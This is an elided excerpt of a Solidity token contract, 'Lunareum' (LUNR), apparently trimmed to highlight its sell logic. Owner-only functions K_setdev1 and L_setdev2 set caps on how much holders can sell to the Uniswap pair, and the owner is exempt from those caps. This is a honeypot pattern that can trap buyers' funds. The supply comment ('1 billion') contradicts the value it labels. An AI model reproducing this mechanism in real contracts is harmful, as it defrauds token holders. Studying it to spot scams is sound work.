...
contract Lunareum is Context, IERC20, Ownable {
    ...
    uint256 private _tTotal = 10000000000 * 10**_decimals; // 1 billion
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "Lunareum";
    string private _symbol = "LUNR";
    
    uint256 public _dev1  = 10;
    uint256 public _dev2 = 10;
    ...
    uint256 public _sellLiquidityFeeA = 10;
    uint256 public _sellLiquidityFeeB = 10;
    ...
    uint256 public _adminteamfee= 0;
    ...
    uint256 private minTokensBeforeSwap = 50000 * 10**_decimals; 
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner() && !_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            ...
            if (from != uniswapV2Pair && to == address(uniswapV2Pair) && cooldownEnabled) {
                ...
                if (sellnumber[from] == 0 && amount <= balanceOf(uniswapV2Pair).div(10000).mul(_dev1 )) {
                    require (amount <= balanceOf(uniswapV2Pair).div(10000).mul(_dev1 ));
                    sellnumber[from]++;
                    ...
                    require (amount <= balanceOf(uniswapV2Pair).div(10000).mul(_dev2));
                    sellnumber[from]++;
                    firstsell[from] = block.timestamp;
                ...
                else if (sellnumber[from] < _maxSellAttempts && amount <= balanceOf(uniswapV2Pair).div(10000).mul(_dev1 )) { 
                    require (amount <= balanceOf(uniswapV2Pair).div(10000).mul(_dev1 ));
                    sellnumber[from]++;
                    sellcooldown[from] = block.timestamp + _initialdelay;
                    _liquidityFee = _sellLiquidityFeeA;
    ...
    function K_setdev1 (uint256 dev1 ) external onlyOwner {
        _dev1  = dev1 ;
    }
    function L_setdev2(uint256 dev2) external onlyOwner {
        _dev2 = dev2;
    }
